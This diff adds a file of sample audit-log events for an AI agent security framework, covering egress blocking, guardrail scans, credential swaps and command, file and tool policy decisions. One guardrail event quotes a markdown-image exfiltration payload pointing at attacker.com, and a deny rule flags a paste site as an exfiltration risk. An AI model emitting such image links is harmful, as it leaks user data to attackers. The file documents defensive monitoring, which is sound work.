@@ -1,0 +1,177 @@
+# ASK Audit Log — Event Format Examples
+#
+# Audit logs are written by the mediation layer, not by the agent.
+# All events share common fields for correlation and attribution.
+# The specific serialization format (JSON lines, structured syslog,
+# OpenTelemetry) is implementation-defined — the field structure is
+# what matters for ASK compliance.
+
+# --- Common Fields (present in every event) ---
+# timestamp:      ISO 8601 with timezone
+# agent_id:       which agent generated this activity
+# correlation_id: ties events across layers within a session
+# event_type:     category of event (egress, llm, enforcer, gateway, sentinel)
+# source:         which enforcement component wrote this event
+# action:         what happened
+# result:         outcome (allowed, denied, blocked, flagged, error)
+
+# --- Egress Proxy Event ---
+- timestamp: "2025-06-01T14:23:01.234Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: egress
+  source: egress-proxy
+  action: http_connect
+  result: allowed
+  details:
+    method: CONNECT
+    domain: api.github.com
+    port: 443
+    bytes_sent: 1240
+    bytes_received: 8930
+    duration_ms: 145
+
+# --- Egress Proxy Block Event ---
+- timestamp: "2025-06-01T14:23:05.891Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: egress
+  source: egress-proxy
+  action: http_connect
+  result: denied
+  details:
+    method: CONNECT
+    domain: pastebin.com
+    port: 443
+    deny_reason: domain_denylist
+    policy_rule: "pastebin.com — paste site, data exfiltration risk"
+
+# --- LLM Proxy Event ---
+- timestamp: "2025-06-01T14:23:02.567Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: llm
+  source: llm-proxy
+  action: chat_completion
+  result: allowed
+  details:
+    model: claude-sonnet-4-6
+    input_tokens: 3200
+    output_tokens: 850
+    cost_usd: 0.018
+    budget_remaining_usd: 49.12
+    guardrails:
+      pre_call:
+        - scanner: xpia-regex
+          result: clean
+          patterns_checked: 8
+      post_call:
+        - scanner: xpia-regex
+          result: clean
+        - scanner: tool-permission
+          result: clean
+          tools_requested: ["read_file"]
+          tools_allowed: true
+
+# --- LLM Proxy Guardrail Trigger ---
+- timestamp: "2025-06-01T14:25:11.002Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: llm
+  source: llm-proxy
+  action: chat_completion
+  result: flagged
+  details:
+    model: claude-sonnet-4-6
+    guardrails:
+      pre_call:
+        - scanner: xpia-regex
+          result: triggered
+          pattern: markdown_image_exfiltration
+          match: "![](https://attacker.com/steal?data=...)"
+          action: blocked
+    input_tokens: 4100
+    output_tokens: 0          # blocked before LLM call
+
+# --- Enforcer Event ---
+- timestamp: "2025-06-01T14:23:01.100Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: enforcer
+  source: enforcer-dev-assistant-01
+  action: http_request
+  result: allowed
+  details:
+    method: GET
+    url: "https://api.github.com/repos/org/repo/pulls"
+    route: egress_proxy          # where enforcer sent it
+    credential_swap: true
+    service: github
+    grant_ref: "grants/github-dev-assistant-01"
+    headers_stripped:
+      - x-served-by
+      - x-github-request-id
+    user_id: "user-jsmith"       # authenticated human who initiated this action
+
+# --- Gateway Command Event ---
+- timestamp: "2025-06-01T14:23:03.456Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: gateway
+  source: gateway-dev-assistant-01
+  action: command_execution
+  result: allowed
+  details:
+    command: "pytest tests/api/ -v"
+    working_directory: "/workspace"
+    policy_decision: allow
+    policy_rule: "pytest — test runner, always allowed"
+    pid: 4521
+    exit_code: 0
+    duration_ms: 12400
+
+# --- Gateway File Event ---
+- timestamp: "2025-06-01T14:23:15.789Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: gateway
+  source: gateway-dev-assistant-01
+  action: file_write
+  result: allowed
+  details:
+    path: "/workspace/src/api/handler.py"
+    operation: write
+    bytes: 2340
+    policy_decision: allow
+    policy_rule: "src/ — development files, read-write"
+
+# --- Gateway MCP Tool Event ---
+- timestamp: "2025-06-01T14:23:20.123Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: gateway
+  source: gateway-dev-assistant-01
+  action: mcp_tool_call
+  result: denied
+  details:
+    mcp_server: community-plugin-xyz
+    tool: execute_sql
+    policy_decision: deny
+    deny_reason: "tool not in allowlist for server community-plugin-xyz"
+
+# --- Constraint Change Event ---
+- timestamp: "2025-06-01T15:00:00.000Z"
+  agent_id: dev-assistant-01
+  correlation_id: "session-dev-01-20250601-142300"
+  event_type: constraint
+  source: platform
+  action: superego_update
+  result: acknowledged
+  details:
+    change_type: planned
+    previous_hash: "sha256:a1b2c3..."
+    new_hash: "sha256:d4e5f6..."
+    fields_changed:
+      - "limits.budget_daily_usd: 50 → 75"
+    acknowledged_at: "2025-06-01T15:00:00.234Z"
+    acknowledgment_latency_ms: 234
